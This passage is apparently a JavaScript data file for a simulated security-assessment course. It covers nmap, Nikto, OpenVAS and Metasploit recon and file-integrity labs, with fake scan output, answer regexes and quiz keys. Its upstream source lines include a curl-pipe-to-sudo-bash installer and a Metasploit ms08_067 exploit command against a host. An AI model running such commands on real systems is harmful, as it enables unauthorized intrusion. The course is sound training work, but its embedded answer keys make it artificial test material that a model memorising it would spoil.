// ============================================================
//  Security Assessments Track — Labs (Agent 05)
// ============================================================
//  sa-1  Network Security Assessment
//  sa-2  File System Security
//  sa-3  Web Application Security  (BurpProxyLabShell)
//  sa-4  System Log Assessment
//  sa-5  User Account Security  (IamMatrixLabShell)
//
//  Shells defined in src/shells/security-assessments-shells.jsx.
//  Bash builtins extended there with realistic stubs (nmap, nikto,
//  faillog, getfacl, …).
// ============================================================

(function () {
  // ────────────────────────────────────────────────────────────
  //  sa-1  Network Security Assessment
  // ────────────────────────────────────────────────────────────
  const SA1_NMAP_ARP = [
    'Starting Nmap 7.94 ( https://nmap.org ) at 2026-04-23 09:14 EDT',
    'Nmap scan report for gw.corp.example.local (10.10.24.1)',
    'Host is up (0.00091s latency).',
    'Nmap scan report for DC-01.corp.example.local (10.10.24.10)',
    'Host is up (0.00084s latency).',
    'Nmap scan report for app.example.local (10.10.24.15)',
    'Host is up (0.00076s latency).',
    'Nmap scan report for WKSTN-07.corp.example.local (10.10.24.42)',
    'Host is up (0.00092s latency).',
    'Nmap done: 256 IP addresses (4 hosts up) scanned in 8.43 seconds',
  ].join('\n') + '\n';

  const SA1_NMAP_HOST = [
    'Starting Nmap 7.94 ( https://nmap.org ) at 2026-04-23 09:21 EDT',
    'Nmap scan report for app.example.local (10.10.24.15)',
    'Host is up (0.00077s latency).',
    'Not shown: 994 closed tcp ports (reset)',
    'PORT     STATE SERVICE',
    '22/tcp   open  ssh',
    '80/tcp   open  http',
    '443/tcp  open  https',
    '445/tcp  open  microsoft-ds',
    '3389/tcp open  ms-wbt-server',
    '5985/tcp open  wsman',
    'Nmap done: 1 IP address (1 host up) scanned in 1.82 seconds',
  ].join('\n') + '\n';

  function buildSa1Fs() {
    return {
      'home': {
        'student': {
          '.bashrc': 'alias ll="ls -la"\n',
          'scans': {
            'README.txt': 'Pre-collected scan output for the rotation.\n',
          },
        },
      },
      'var': {
        'lib': {
          'sa': {
            'nmap-arp.txt':         SA1_NMAP_ARP,
            'nmap-host.txt':        SA1_NMAP_HOST,
            'nmap-10.10.24.0_24.txt': SA1_NMAP_ARP,
            'nmap-10.10.24.15.txt':   SA1_NMAP_HOST,
          },
        },
        'log': {
          'apache2': { 'access.log': '' },
        },
      },
      'etc': {
        'hosts': '127.0.0.1 localhost\n10.10.24.10 DC-01\n10.10.24.15 app.example.local\n',
      },
      'tmp': {},
    };
  }

  const SA1_LAB = {
    id: 'sa-1',
    track: 'security-assessments',
    title: 'Basic Network Security Assessment',
    difficulty: 'Beginner',
    estimatedTime: '50 min',
    icon: '🛰',
    tags: ['nmap', 'Recon', 'Network'],

    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-1-Basic Network Security Assessment.md',
      sha256: '9daafb410ac8a5bfa8acea30db07014581c2c559e79d4c8ba33fd7681782b799',
      snapshot: 'src/data/sources/sa-1.source.md',
    },

    environment: { type: 'linux', shell: 'LinuxTerminalShell', fs: buildSa1Fs },

    scenario: {
      role: 'Junior security analyst on the network-recon rotation',
      incident: 'Your team is preparing a baseline assessment of the 10.10.24.0/24 segment. You have been asked to enumerate live hosts, open ports, and any management interfaces that are unexpectedly exposed to the internal network.',
    },

    exercises: [
      {
        id: 'ex1',
        upstreamHeading: 'Exercise 1: Network Scanning with Nmap',
        steps: [
          {
            id: 'sa-1.ex1.s1',
            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install nmap' },
            kind: 'command',
            instruction: 'Install Nmap on the kali workstation.',
            hint: 'Use apt: `sudo apt-get install nmap`. The package manager is simulated.',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?nmap\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-1.ex1.s2',
            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'nmap -sn 192.168.1.0/24' },
            kind: 'command',
            instruction: 'Run a host-discovery (ping) scan against the assigned subnet 10.10.24.0/24.',
            hint: 'nmap -sn 10.10.24.0/24',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?nmap\s+-sn\s+10\.10\.24\.0\/24\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa1-q1',
          },
          {
            id: 'sa-1.ex1.s3',
            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'nmap -sS 192.168.1.10' },
            kind: 'command',
            instruction: 'Pick the live host that resolves to app.example.local and run a stealth SYN scan against it.',
            hint: 'nmap -sS 10.10.24.15',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?nmap\s+(-sS|-sT|-A)\s+10\.10\.24\.15\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 15,
            checkOnLearning: 'sa1-q2',
          },
        ],
      },
      {
        id: 'ex2',
        upstreamHeading: 'Exercise 2: Traffic Analysis with Wireshark',
        steps: [
          {
            id: 'sa-1.ex2.s1',
            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install wireshark' },
            kind: 'command',
            instruction: 'Install Wireshark (the CLI tshark binary backs the same dissector engine).',
            hint: '`sudo apt-get install wireshark`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?wireshark\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-1.ex2.s2',
            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'Capture network traffic on the selected interface' },
            kind: 'command',
            instruction: 'Use tshark on the ens33 interface to capture a quick sample (10 packets).',
            hint: '`tshark -i ens33 -c 10`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?tshark\s+(-i\s+ens33\s+)?(-c\s+\d+\s*)?$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
          },
          {
            id: 'sa-1.ex2.s3',
            upstream: { exercise: 'Exercise 2', stepNumber: 3, sourceLine: 'Analyze captured traffic for suspicious patterns' },
            kind: 'analyze',
            instruction: 'In the captured sample, which application-layer protocol is in use between 10.10.24.42 and 10.10.24.15?',
            hint: 'Read the Protocol column of the tshark output.',
            validation: { type: 'valueExtracted', expected: ['HTTP', 'http'] },
            points: 10,
            checkOnLearning: 'sa1-q6',
          },
        ],
      },
      {
        id: 'ex3',
        upstreamHeading: 'Exercise 3: Vulnerability Scanning with OpenVAS',
        steps: [
          {
            id: 'sa-1.ex3.s1',
            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'sudo apt-get install openvas && sudo openvas-setup' },
            kind: 'command',
            instruction: 'Install Greenbone OpenVAS / GVM.',
            hint: '`sudo apt-get install openvas`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?openvas\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-1.ex3.s2',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'Configure and start OpenVAS — UI at https://localhost:9392' },
            kind: 'command',
            instruction: 'Run the post-install setup — that creates the CA, the admin user, and the syncs the NVT feed.',
            hint: '`sudo openvas-setup`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?openvas-setup\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
          },
          {
            id: 'sa-1.ex3.s3',
            upstream: { exercise: 'Exercise 3', stepNumber: 3, sourceLine: 'Run a vulnerability scan task against the target subnet' },
            kind: 'analyze',
            instruction: 'Once setup completes, on which TCP port does the OpenVAS web UI listen?',
            hint: 'Read the last line of the openvas-setup output. The URL shows the port.',
            validation: { type: 'valueExtracted', expected: ['9392'] },
            points: 10,
            checkOnLearning: 'sa1-q3',
          },
        ],
      },
      {
        id: 'ex4',
        upstreamHeading: 'Exercise 4: Web Server Assessment with Nikto',
        steps: [
          {
            id: 'sa-1.ex4.s1',
            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'sudo apt-get install nikto' },
            kind: 'command',
            instruction: 'Install Nikto.',
            hint: '`sudo apt-get install nikto`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?nikto\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-1.ex4.s2',
            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'nikto -h http://192.168.1.10' },
            kind: 'command',
            instruction: 'Scan the discovered web server at 10.10.24.15 for common misconfigurations.',
            hint: '`nikto -h http://10.10.24.15`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?nikto\s+-h\s+(https?:\/\/)?(10\.10\.24\.15|app\.example\.local).*$/ }],
            validation: { type: 'commandExecuted' },
            points: 15,
            checkOnLearning: 'sa1-q4',
          },
        ],
      },
      {
        id: 'ex5',
        upstreamHeading: 'Exercise 5: Exploitation Testing with Metasploit',
        steps: [
          {
            id: 'sa-1.ex5.s1',
            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'curl https://raw.githubusercontent.com/rapid7/metasploit-framework/.../msfupdate | sudo bash' },
            kind: 'command',
            instruction: 'Install / update Metasploit (use the package manager — the upstream curl-pipe-bash is replaced for safety).',
            hint: '`sudo apt-get install metasploit-framework`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?metasploit-framework\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-1.ex5.s2',
            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'msfconsole' },
            kind: 'command',
            instruction: 'Launch the Metasploit console.',
            hint: '`msfconsole`',
            acceptedInputs: [{ type: 'regex', value: /^msfconsole\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
          },
          {
            id: 'sa-1.ex5.s3',
            upstream: { exercise: 'Exercise 5', stepNumber: 3, sourceLine: 'use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.10; run' },
            kind: 'analyze',
            instruction: 'WinRM (HTTP) is exposed on TCP/5985 of 10.10.24.15. WinRM is typically delivered by which Windows component?',
            hint: 'Check your stealth-scan output. The 5985 service banner reveals the answer.',
            validation: { type: 'valueExtracted', expected: ['wsman', 'WinRM', 'winrm'] },
            points: 15,
            checkOnLearning: 'sa1-q5',
          },
        ],
      },
    ],

    checkOnLearning: [
      {
        id: 'sa1-q1',
        bloom: 'recall',
        question: 'What does Nmap\'s -sn flag do?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'TCP SYN scan with no port enumeration', correct: false },
          { id: 'b', text: 'Host-discovery only (no port scan)', correct: true },
          { id: 'c', text: 'Service / version detection', correct: false },
          { id: 'd', text: 'Stealth UDP scan', correct: false },
        ],
        triggerOn: { stepId: 'sa-1.ex1.s2' },
        reinforces: 'sa-1.ex1.s2',
      },
      {
        id: 'sa1-q2',
        bloom: 'comprehension',
        question: 'Your -sS scan of 10.10.24.15 returned six open ports including 5985/wsman. Which of these are unusual to find exposed on a workstation network segment?',
        type: 'multi-select',
        options: [
          { id: 'a', text: '22/tcp ssh', correct: false },
          { id: 'b', text: '5985/tcp wsman (WinRM HTTP)', correct: true },
          { id: 'c', text: '3389/tcp ms-wbt-server (RDP)', correct: true },
          { id: 'd', text: '443/tcp https', correct: false },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-1.ex1.s3' },
        reinforces: 'sa-1.ex1.s3',
      },
      {
        id: 'sa1-q3',
        bloom: 'recall',
        question: 'Which TCP port does the Greenbone (OpenVAS) web UI listen on by default?',
        type: 'short-answer',
        acceptedAnswer: ['9392', 'tcp/9392'],
        triggerOn: { stepId: 'sa-1.ex3.s3' },
        reinforces: 'sa-1.ex3.s3',
      },
      {
        id: 'sa1-q4',
        bloom: 'application',
        question: 'Nikto reported a missing httponly flag on the PHPSESSID cookie. Which class of attack does that primarily enable?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'SQL injection', correct: false },
          { id: 'b', text: 'Session-cookie theft via XSS', correct: true },
          { id: 'c', text: 'CSRF token bypass', correct: false },
          { id: 'd', text: 'Open redirect', correct: false },
        ],
        triggerOn: { stepId: 'sa-1.ex4.s2' },
        reinforces: 'sa-1.ex4.s2',
      },
      {
        id: 'sa1-q5',
        bloom: 'analysis',
        question: 'Given the discovered exposure of 5985/wsman on 10.10.24.15, pick every reasonable next investigative step.',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'Confirm with the system owner whether WinRM is intentionally enabled', correct: true },
          { id: 'b', text: 'Check for authentication logs on that host for unexpected WinRM activity', correct: true },
          { id: 'c', text: 'Run `msfconsole` and exploit the host immediately without authorization', correct: false },
          { id: 'd', text: 'Open a finding to disable WinRM if it is not required for that role', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-1.ex5.s3' },
        reinforces: 'sa-1.ex5.s3',
      },
      {
        id: 'sa1-q6',
        bloom: 'application',
        question: 'You identified HTTP in the quick tshark capture between 10.10.24.42 and 10.10.24.15. What is the best next step if that traffic should have been encrypted?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'Validate whether the service should be moved to HTTPS/TLS and document the plaintext exposure.', correct: true },
          { id: 'b', text: 'Ignore it because any internal HTTP traffic is automatically safe.', correct: false },
          { id: 'c', text: 'Shut down the host immediately without collecting context.', correct: false },
          { id: 'd', text: 'Assume the packet capture is corrupted and discard it.', correct: false },
        ],
        triggerOn: { stepId: 'sa-1.ex2.s3' },
        reinforces: 'sa-1.ex2.s3',
      },
    ],

    completion: { requireAllSteps: true, minQuizScore: 0.8 },
  };

  // ────────────────────────────────────────────────────────────
  //  sa-2  File System Security
  // ────────────────────────────────────────────────────────────
  const SA2_TRIPWIRE = [
    'Parsing policy file: /etc/tripwire/tw.pol',
    '*** Processing Unix File System ***',
    'Performing integrity check...',
    'Wrote report file: /var/lib/tripwire/report/dc-01-20260423-150217.twr',
    '',
    'Tripwire(R) 2.4.3 Integrity Check Report',
    '',
    'Report generated by:          root',
    'Report created on:            Thu Apr 23 15:02:17 2026',
    'Database last updated on:     Mon Apr 20 06:00:01 2026',
    '',
    '===============================================================================',
    'Report Summary:',
    '===============================================================================',
    '',
    'Host name:                    DC-01.corp.example.local',
    'Total objects scanned:        18327',
    'Total violations found:       3',
    '',
    '-------------------------------------------------------------------------------',
    'Object Summary:',
    '-------------------------------------------------------------------------------',
    '',
    '# Section: Unix File System',
    '',
    'Rule Name                       Severity Level    Added    Removed  Modified',
    '---------                       --------------    -----    -------  --------',
    'Critical configuration files    100               0        0        2',
    'Security-sensitive directories   80               1        0        0',
    '',
    'Modified:',
    '  /etc/passwd',
    '  /etc/sudoers',
    '',
    'Added:',
    '  /srv/share/finance/wages-2025-Q4.xlsx',
  ].join('\n') + '\n';

  const SA2_AIDE = [
    'AIDE 0.17.4 found differences between database and filesystem!!',
    'Start timestamp: 2026-04-23 15:14:11 -0400 (AIDE 0.17.4)',
    'AIDE found differences between database and filesystem!!',
    '',
    'Summary:',
    '  Total number of entries:      24811',
    '  Added entries:                1',
    '  Removed entries:              0',
    '  Changed entries:              2',
    '',
    '---------------------------------------------------',
    'Added entries:',
    '---------------------------------------------------',
    'f++++++++++++++++: /srv/share/finance/wages-2025-Q4.xlsx',
    '',
    '---------------------------------------------------',
    'Changed entries:',
    '---------------------------------------------------',
    'f   ...    .C... : /etc/passwd',
    'f   ...    .C... : /etc/sudoers',
  ].join('\n') + '\n';

  const SA2_CHKROOT = [
    'ROOTDIR is `/\'',
    'Checking `amd\'... not found',
    'Checking `chsh\'... not infected',
    'Checking `cron\'... not infected',
    'Checking `crontab\'... not infected',
    'Checking `ifconfig\'... not infected',
    'Checking `lsof\'... not infected',
    'Checking `netstat\'... not infected',
    'Checking `passwd\'... not infected',
    'Checking `sshd\'... not infected',
    'Checking `bindshell\'... not infected',
    'Checking `lkm\'... nothing detected',
    'Checking `rexedcs\'... not found',
    'Checking `sniffer\'... lo: not promisc and no PF_PACKET sockets',
    'Searching for sniffer\'s logs, it may take a while... nothing found',
  ].join('\n') + '\n';

  function buildSa2Fs() {
    return {
      'home': { 'student': { '.bashrc': 'alias ll="ls -la"\n' } },
      'srv': {
        'share': {
          'finance': {
            'wages-2025-Q4.xlsx': { __file: true, content: 'binary xlsx', mode: '0777', owner: 'root', group: 'finance' },
            'tax-form-W2-jsanders.pdf': { __file: true, content: 'binary pdf', mode: '0777', owner: 'root', group: 'finance' },
          },
          'public': {
            'README.txt': 'Public read-only share.\n',
          },
        },
      },
      'etc': {
        'passwd': 'root:x:0:0:root:/root:/bin/bash\nj.sanders:x:1001:1001::/home/j.sanders:/bin/bash\nm.chen:x:1002:1002::/home/m.chen:/bin/bash\nsvc_backup:x:1003:1003::/var/lib/backup:/bin/false\ntemp.contractor:x:1099:1099::/home/temp.contractor:/bin/bash\n',
        'sudoers': '# /etc/sudoers\nroot ALL=(ALL:ALL) ALL\nhelpdesk-admin ALL=(ALL) NOPASSWD: /usr/bin/systemctl\ntemp.contractor ALL=(ALL) NOPASSWD: ALL\n',
        'audit': { 'rules.d': { '_b2b.rules': '' } },
      },
      'var': {
        'lib': {
          'sa': {
            'tripwire-report.txt': SA2_TRIPWIRE,
            'aide-check.txt':      SA2_AIDE,
            'chkrootkit-report.txt': SA2_CHKROOT,
            'ausearch-passwd.txt':
              '----\ntime->Thu Apr 23 14:41:09 2026\ntype=PATH msg=audit(1745423469.118:412): item=0 name="/etc/passwd" inode=786433 dev=08:01 mode=0100644 ouid=0 ogid=0\ntype=SYSCALL msg=audit(1745423469.118:412): arch=c000003e syscall=257 success=yes exit=4 comm="vi" exe="/usr/bin/vi" key="passwd_changes"\n',
          },
          'aide': { 'aide.db': { __file: true, content: 'aide-db', mode: '0600' } },
        },
        'log': {},
      },
      'usr': { 'bin': { 'find_old': { __file: true, content: '#!/bin/sh\n', mode: '4755', owner: 'root', group: 'root' } } },
      'tmp': {},
    };
  }

  const SA2_LAB = {
    id: 'sa-2',
    track: 'security-assessments',
    title: 'File System Security Assessment',
    difficulty: 'Beginner',
    estimatedTime: '50 min',
    icon: '🗂',
    tags: ['Auditd', 'Tripwire', 'AIDE', 'OSSEC', 'chkrootkit'],

    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-2-File System Security Assessment.md',
      sha256: '261c60ac55c3739e3721cab757410fad4d646956c80ae145f5eee6e9329c54c9',
      snapshot: 'src/data/sources/sa-2.source.md',
    },

    environment: { type: 'linux', shell: 'LinuxTerminalShell', fs: buildSa2Fs },

    scenario: {
      role: 'SOC analyst on the host-integrity rotation',
      incident: 'A finance share (`/srv/share/finance`) was flagged by an internal audit as potentially world-readable. You are asked to verify the share permissions, baseline file integrity, and check for any rootkit indicators on DC-01.',
    },

    exercises: [
      {
        id: 'ex1',
        upstreamHeading: 'Exercise 1: Monitoring File Access with Auditd',
        steps: [
          {
            id: 'sa-2.ex1.s1',
            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install auditd' },
            kind: 'command',
            instruction: 'Install Auditd.',
            hint: '`sudo apt-get install auditd`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?auditd\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex1.s2',
            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'sudo auditctl -w /etc/passwd -p wa -k passwd_changes' },
            kind: 'command',
            instruction: 'Watch /etc/passwd for write/attribute-change operations and tag them with the key passwd_changes.',
            hint: '`sudo auditctl -w /etc/passwd -p wa -k passwd_changes`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?auditctl\s+-w\s+\/etc\/passwd\s+-p\s+wa\s+-k\s+passwd_changes\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa2-q1',
          },
          {
            id: 'sa-2.ex1.s3',
            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'sudo ausearch -k passwd_changes' },
            kind: 'command',
            instruction: 'Read back any audit events tagged passwd_changes.',
            hint: '`sudo ausearch -k passwd_changes`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?ausearch\s+-k\s+passwd_changes\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
          },
        ],
      },
      {
        id: 'ex2',
        upstreamHeading: 'Exercise 2: File Integrity Monitoring with Tripwire',
        steps: [
          {
            id: 'sa-2.ex2.s1',
            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install tripwire' },
            kind: 'command',
            instruction: 'Install Tripwire.',
            hint: '`sudo apt-get install tripwire`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?tripwire\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex2.s2',
            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'sudo tripwire --init' },
            kind: 'command',
            instruction: 'Initialize the Tripwire baseline database.',
            hint: '`sudo tripwire --init`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?tripwire\s+--init\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex2.s3',
            upstream: { exercise: 'Exercise 2', stepNumber: 3, sourceLine: 'sudo tripwire --check' },
            kind: 'command',
            instruction: 'Run an integrity check against the baseline. Note any modified files.',
            hint: '`sudo tripwire --check`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?tripwire\s+--check\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 15,
            checkOnLearning: 'sa2-q2',
          },
        ],
      },
      {
        id: 'ex3',
        upstreamHeading: 'Exercise 3: System Integrity Check with AIDE',
        steps: [
          {
            id: 'sa-2.ex3.s1',
            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'sudo apt-get install aide' },
            kind: 'command',
            instruction: 'Install AIDE.',
            hint: '`sudo apt-get install aide`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?aide\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex3.s2',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'sudo aideinit' },
            kind: 'command',
            instruction: 'Build the AIDE baseline database.',
            hint: '`sudo aideinit`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?aideinit\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex3.s3',
            upstream: { exercise: 'Exercise 3', stepNumber: 3, sourceLine: 'sudo aide --check' },
            kind: 'analyze',
            instruction: 'Run an AIDE check and identify which sensitive file under /etc shows a content-change since the baseline. Submit just the path.',
            hint: 'Look for the entry under "Changed entries" with the .C... flag indicating content change.',
            validation: { type: 'valueExtracted', expected: ['/etc/passwd', '/etc/sudoers'] },
            points: 15,
            checkOnLearning: 'sa2-q3',
          },
        ],
      },
      {
        id: 'ex4',
        upstreamHeading: 'Exercise 4: Host-Based Intrusion Detection with OSSEC',
        steps: [
          {
            id: 'sa-2.ex4.s1',
            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'sudo apt-get install ossec-hids' },
            kind: 'command',
            instruction: 'Install OSSEC HIDS (the upstream uses an atomicorp installer; the package manager works the same way for our sim).',
            hint: '`sudo apt-get install ossec-hids`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?ossec-hids(-server)?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex4.s2',
            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'Edit /var/ossec/etc/ossec.conf' },
            kind: 'command',
            instruction: 'Open the OSSEC config (/var/ossec/etc/ossec.conf) for review.',
            hint: '`cat /var/ossec/etc/ossec.conf` (or use less)',
            acceptedInputs: [
              { type: 'regex', value: /^(less|cat|nano)\s+\/var\/ossec\/etc\/ossec\.conf\s*$/ },
            ],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex4.s3',
            upstream: { exercise: 'Exercise 4', stepNumber: 3, sourceLine: 'sudo systemctl start ossec' },
            kind: 'command',
            instruction: 'Start the OSSEC service.',
            hint: '`sudo systemctl start ossec`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+start\s+ossec\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex4.s4',
            upstream: { exercise: 'Exercise 4', stepNumber: 4, sourceLine: 'sudo tail -f /var/ossec/logs/alerts/alerts.log' },
            kind: 'command',
            instruction: 'Tail the OSSEC alerts log.',
            hint: '`sudo tail -F /var/ossec/logs/alerts/alerts.log`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?tail\s+-(F|f)\s+\/var\/ossec\/logs\/alerts\/alerts\.log\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
            checkOnLearning: 'sa2-q5',
          },
        ],
      },
      {
        id: 'ex5',
        upstreamHeading: 'Exercise 5: Rootkit Detection with Chkrootkit',
        steps: [
          {
            id: 'sa-2.ex5.s1',
            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo apt-get install chkrootkit' },
            kind: 'command',
            instruction: 'Install chkrootkit.',
            hint: '`sudo apt-get install chkrootkit`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?chkrootkit\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-2.ex5.s2',
            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'sudo chkrootkit' },
            kind: 'analyze',
            instruction: 'Run chkrootkit. Did it find any rootkit indicators? Submit yes or no.',
            hint: 'Read the closing summary lines of the chkrootkit output for any "INFECTED" markers.',
            validation: { type: 'valueExtracted', expected: ['no', 'No', 'NO', 'none'] },
            points: 10,
            checkOnLearning: 'sa2-q4',
          },
        ],
      },
    ],

    checkOnLearning: [
      {
        id: 'sa2-q1',
        bloom: 'recall',
        question: 'In auditctl -w /etc/passwd -p wa -k passwd_changes, what does the wa indicate?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'Watch attribute changes only', correct: false },
          { id: 'b', text: 'Watch writes and attribute changes', correct: true },
          { id: 'c', text: 'Watch all reads', correct: false },
          { id: 'd', text: 'Web access', correct: false },
        ],
        triggerOn: { stepId: 'sa-2.ex1.s2' },
        reinforces: 'sa-2.ex1.s2',
      },
      {
        id: 'sa2-q2',
        bloom: 'comprehension',
        question: 'Tripwire reported 2 modified files (/etc/passwd, /etc/sudoers) and 1 new file under /srv/share/finance. Which finding is most urgent for a SOC analyst?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'The new file under /srv/share/finance', correct: false },
          { id: 'b', text: 'The modified /etc/sudoers', correct: true },
          { id: 'c', text: 'The modified /etc/passwd alone', correct: false },
          { id: 'd', text: 'None — Tripwire produces lots of noise', correct: false },
        ],
        triggerOn: { stepId: 'sa-2.ex2.s3' },
        reinforces: 'sa-2.ex2.s3',
      },
      {
        id: 'sa2-q3',
        bloom: 'application',
        question: 'In the AIDE output, the .C... flag column on a changed entry means…',
        type: 'short-answer',
        acceptedAnswer: [/content/i, 'Content', 'content'],
        triggerOn: { stepId: 'sa-2.ex3.s3' },
        reinforces: 'sa-2.ex3.s3',
      },
      {
        id: 'sa2-q4',
        bloom: 'analysis',
        question: 'Chkrootkit returned no infections. Pick every conclusion that is reasonable to draw.',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'No common userspace rootkits matched the signatures it knows about', correct: true },
          { id: 'b', text: 'There is definitely no malware on the host', correct: false },
          { id: 'c', text: 'Tripwire / AIDE results still need to be reviewed independently', correct: true },
          { id: 'd', text: 'Kernel-level rootkits and custom implants would not necessarily show up', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-2.ex5.s2' },
        reinforces: 'sa-2.ex5.s2',
      },
      {
        id: 'sa2-q5',
        bloom: 'comprehension',
        question: 'OSSEC is useful here because it complements Tripwire and AIDE in what way?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'It gives real-time host alerts instead of only baseline-diff reports', correct: true },
          { id: 'b', text: 'It permanently prevents all file modifications', correct: false },
          { id: 'c', text: 'It replaces the Linux audit subsystem entirely', correct: false },
          { id: 'd', text: 'It only scans web applications', correct: false },
        ],
        triggerOn: { stepId: 'sa-2.ex4.s4' },
        reinforces: 'sa-2.ex4.s4',
      },
    ],

    completion: { requireAllSteps: true, minQuizScore: 0.8 },
  };

  // ────────────────────────────────────────────────────────────
  //  sa-3  Web Application Security  (BurpProxyLabShell)
  // ────────────────────────────────────────────────────────────
  function buildSa3Burp() {
    // ~80 captured requests against https://app.example.local/
    const rows = [];
    let id = 1;
    function add(method, url, status, length, opts) {
      const o = opts || {};
      rows.push({
        id: 'r' + id++,
        method: method,
        url: url,
        hasParams: !!o.params,
        edited: false,
        status: status,
        length: length,
        mime: o.mime || 'HTML',
        title: o.title || '',
        tls: true,
        ip: '10.10.24.15',
        request: o.request || `${method} ${url} HTTP/1.1\nHost: app.example.local\nUser-Agent: Mozilla/5.0\nCookie: PHPSESSID=8f3a1c\nAccept: */*\n\n`,
        response: o.response || `HTTP/1.1 ${status} OK\nContent-Type: text/html; charset=utf-8\nContent-Length: ${length}\n\n<html>...${status === 200 ? 'OK' : 'response'}...</html>\n`,
      });
    }

    // Browse: home, login, dashboard, products
